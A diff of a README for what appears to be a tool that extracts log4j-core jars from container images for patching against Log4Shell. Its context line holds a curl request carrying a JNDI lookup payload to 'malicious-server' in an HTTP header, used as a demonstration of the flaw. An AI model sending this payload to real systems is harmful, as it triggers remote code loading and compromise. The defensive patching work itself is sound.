@@ -65,15 +65,15 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://malicious-server:1389/}'
 Clone this repository and compile `image-patcher`
 
 ```
-make build
+make
 ```
 
-Use `image-patcher extract-jar` to extract the (suspected) vulnerable files.
+Use `image-patcher extract` to extract the (suspected) vulnerable files.
 It will go through all files in the source image and find `log4j-core` either directly as `jar` file or embedded within another `jar` file.
 The command will extract all matching files to the `patch` directory.
 
 ```
-./image-patcher extract-jar -source-tag vulnerable-app:latest -match 'log4j-core.+\.jar' -dest-dir patch
+./image-patcher extract -search-jars -source-tag vulnerable-app:latest -match 'log4j-core.+\.jar' -dest-dir patch
 ```
 
 In this case, the `log4j-core` package is within executable `jar`.
